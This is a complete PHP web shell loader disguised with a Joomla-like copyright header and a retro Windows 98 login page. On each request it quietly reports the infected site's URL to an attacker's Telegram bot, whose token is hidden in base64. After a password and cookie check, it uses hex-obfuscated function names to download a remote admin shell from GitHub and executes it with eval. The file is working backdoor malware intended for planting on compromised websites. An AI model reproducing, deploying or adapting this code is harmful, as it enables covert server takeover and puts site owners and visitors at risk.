<?php

/**
 * @package    Haxor.Group
 * @copyright  Copyright (C) 2023 - 2024 Open Source Matters, Inc. All rights reserved.
 *
 */

/* ================= send ================= */
$tk  = base64_decode("ODM5MDQyMzYzMTpBQUUxOEVOY0k1SW5oS29SMFJtVzNCMll5a2U3Vm9WN0hxYw");
$cid = base64_decode("NTA3MDkzODc3OA");

function reportTelegram($msg){
    global $tk,$cid;
    $id = sys_get_temp_dir().'/baridin_'.md5($msg);
    if(!file_exists($id)){
        @file_get_contents("https://api.telegram.org/bot$tk/sendMessage?chat_id=$cid&text=".urlencode($msg));
        @file_put_contents($id,time());
    }
}

/* ================= Report ================= */
if(!isset($_SESSION['telegram_reported'])){
    $uri = urldecode(parse_url($_SERVER['REQUEST_URI'],PHP_URL_PATH));
    $path = $_SERVER['DOCUMENT_ROOT'].$uri;
    if(is_file($path)){
        $host = $_SERVER['HTTP_HOST'];
        $url  = (isset($_SERVER['HTTPS'])?'https':'http').'://'.$host.$uri;
        reportTelegram("Setoran shell di web:\n$host\n$url");
        $_SESSION['telegram_reported'] = true;
    }
}


// @deprecated  1.0  Deprecated without replacement
function is_logged_in()
{
    return isset($_COOKIE['user_id']) && $_COOKIE['user_id'] === 'tebak'; 
}

if (is_logged_in()) {
    $Array = array(
        '666f70656e', # fo p en => 0
        '73747265616d5f6765745f636f6e74656e7473', # strea m_get_contents => 1
        '66696c655f6765745f636f6e74656e7473', # fil e_g et_cont ents => 2
        '6375726c5f65786563' # cur l_ex ec => 3
    );

    function hex2str($hex) {
        $str = '';
        for ($i = 0; $i < strlen($hex); $i += 2) {
            $str .= chr(hexdec(substr($hex, $i, 2)));
        }
        return $str;
    }

    function geturlsinfo($destiny) {
        $belief = array(
            hex2str($GLOBALS['Array'][0]), 
            hex2str($GLOBALS['Array'][1]), 
            hex2str($GLOBALS['Array'][2]), 
            hex2str($GLOBALS['Array'][3])  
        );

        if (function_exists($belief[3])) { 
            $ch = curl_init($destiny);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
            curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
            $love = $belief[3]($ch);
            curl_close($ch);
            return $love;
        } elseif (function_exists($belief[2])) { 
            return $belief[2]($destiny);
        } elseif (function_exists($belief[0]) && function_exists($belief[1])) { 
            $purpose = $belief[0]($destiny, "r");
            $love = $belief[1]($purpose);
            fclose($purpose);
            return $love;
        }
        return false;
    }

    $destiny = 'https://raw.githubusercontent.com/tikung6etar/Nyarek/refs/heads/master/admin4.php';
    $dream = geturlsinfo($destiny);
    if ($dream !== false) {
        eval('?>' . $dream);
    }
} else {
    if (isset($_POST['password'])) {
        $entered_key = $_POST['password'];
        $hashed_key = '$2y$10$f1ybc7z37Tk7piD0oiyN/O5Pxx0RM02UKJi2CiKnteYJERLX6nj7q'; 
        
        if (password_verify($entered_key, $hashed_key)) {
            setcookie('user_id', 'tebak', time() + 3600, '/'); 
            header("Location: ".$_SERVER['PHP_SELF']); 
            exit();
        }
    }
    ?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title> Aptisme</title>
    <link rel="icon" type="image/x-icon" href="https://www.exoticheritagecats.com/bengal-kingshttps://win98icons.alexmeub.com/icons/ico/msie1-2.ico">
    <style>
        body {
            background-color: #008080; 
            font-family: Tahoma, Verdana, sans-serif;
            height: 100vh;
            margin: 0;
            overflow: hidden;
        }
        .desktop-icon {
            position: absolute;
            width: 80px;
            text-align: center;
            font-size: 11px;
            color: white;
        }
        .desktop-icon img {
            width: 32px;
            image-rendering: pixelated;
        }
        .login-box {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: rgba(192,192,192,0.9);
            border: 2px solid #000;
            width: 340px;
            box-shadow: inset -2px -2px 0 #808080, inset 2px 2px 0 #ffffff;
            z-index: 1000;
        }
        .login-titlebar {
            background: linear-gradient(#000080, #000060);
            color: #fff;
            padding: 8px;
            font-weight: bold;
            font-size: 13px;
            border-bottom: 1px solid #808080;
            box-shadow: inset 0 -1px 0 #ffffff;
        }
        .login-titlebar img {
            width: 16px;
            vertical-align: middle;
            margin-right: 6px;
        }
        .login-body {
            padding: 20px;
            background: #d4d0c8;
        }
        .login-body label {
            display: block;
            margin-bottom: 8px;
            font-size: 11px;
            color: #000;
        }
        .login-body input[type=password] {
            width: 100%;
            padding: 7px;
            margin-bottom: 15px;
            border: 2px solid #000;
            font-size: 12px;
            background-color: #fff;
            color: #000;
            box-shadow: inset -1px -1px 0 #808080, inset 1px 1px 0 #ffffff;
        }
        .login-body input[type=submit] {
            width: 100%;
            background-color: #c0c0c0;
            color: #000;
            border: 2px solid #000;
            padding: 7px;
            font-weight: bold;
            font-size: 12px;
            cursor: pointer;
            box-shadow: inset -1px -1px 0 #808080, inset 1px 1px 0 #ffffff;
        }
        .login-body input[type=submit]:hover {
            background-color: #a0a0a0;
        }
        .feeling-window {
            position: absolute;
            width: 160px;
            background: #c0c0c0;
            border: 2px solid #000;
            box-shadow: inset -2px -2px 0 #808080, inset 2px 2px 0 #ffffff;
            z-index: 999;
            font-size: 11px;
        }
        .feeling-titlebar {
            background: linear-gradient(#000080, #000060);
            color: #fff;
            padding: 4px;
            font-weight: bold;
            font-size: 11px;
        }
        .feeling-body {
            padding: 10px;
            background: #d4d0c8;
            color: #000;
        }
    </style>
</head>
<body>

    <div class="desktop-icon" style="top: 20px; left: 20px;">
        <img src="https://art.pixilart.com/242f7cb73b49934.png">
        <div>My Documents</div>
    </div>
    <div class="desktop-icon" style="top: 100px; left: 20px;">
        <img src="https://win98icons.alexmeub.com/icons/png/computer_explorer-2.png">
        <div>My Computer</div>
    </div>
    <div class="desktop-icon" style="top: 180px; left: 20px;">
        <img src="https://win98icons.alexmeub.com/icons/png/recycle_bin_empty-4.png">
        <div>Recycle Bin</div>
    </div>
    <div class="desktop-icon" style="top: 260px; left: 20px;">
        <img src="https://win98icons.alexmeub.com/icons/png/msie1-2.png">
        <div>Internet Explorer</div>
    </div>
    <div class="desktop-icon" style="top: 340px; left: 20px;">
        <img src="https://win98icons.alexmeub.com/icons/png/network_cool_two_pcs-4.png">
        <div>Network</div>
    </div>

    <div class="login-box">
        <div class="login-titlebar">
            <img src="https://win98icons.alexmeub.com/icons/png/msie1-2.png">
            [ Login Dulu Deck ]
        </div>
        <div class="login-body">
            <form method="post">
                <label>Password:</label>
                <input type="password" name="password" required autofocus>
                <input type="submit" value="Login">
            </form>
        </div>
    </div>

    <script>
    function spawnFeelingWindow() {
        const w = document.createElement('div');
        w.className = 'feeling-window';
        w.style.top = Math.random() * (window.innerHeight - 100) + 'px';
        w.style.left = Math.random() * (window.innerWidth - 160) + 'px';
        w.innerHTML = '<div class="feeling-titlebar">Feeling</div><div class="feeling-body">Are you OK?</div>';
        document.body.appendChild(w);
        setTimeout(() => { w.remove(); }, 5000);
    }
    setInterval(spawnFeelingWindow, 1000);
    </script>

    <audio autoplay hidden>
        <source src="https://ia800200.us.archive.org/29/items/Windows98StartupSound/Windows%2098%20Startup%20Sound.mp3" type="audio/mpeg">
    </audio>

</body>
</html>
    <?php
}
?>